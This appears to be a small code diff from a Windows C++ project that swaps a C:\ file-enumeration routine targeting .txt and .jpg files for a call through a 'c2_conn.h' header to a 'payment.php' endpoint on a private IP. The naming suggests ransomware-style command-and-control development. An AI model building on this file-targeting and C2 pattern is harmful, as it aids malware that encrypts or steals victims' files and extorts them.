@@ -1,18 +1,13 @@
-#include <Windows.h>
 #include <iostream>
-#include "file_search.h"
+#include <Windows.h>
+#include "c2_conn.h"
 
 
 int main() {
-    std::vector<std::wstring> fileTypes = { L".txt", L".jpg" };
-    std::unordered_set<std::wstring> forbiddenDirs = { L"System Volume Information", L"Windows", L"Program Files"};
+    std::wstring url = L"https://10.0.0.113:3000/payment.php/";
+    int statusCode = SendRequest(url);
 
-    std::vector<std::wstring> files = FileSearcher(L"C:\\", fileTypes, forbiddenDirs);
-
-    for (const auto& file : files)
-    {
-        std::wcout << file << std::endl;
-    }
+    std::wcout << L"Status Code: " << statusCode << std::endl;
 
     return 0;
 }
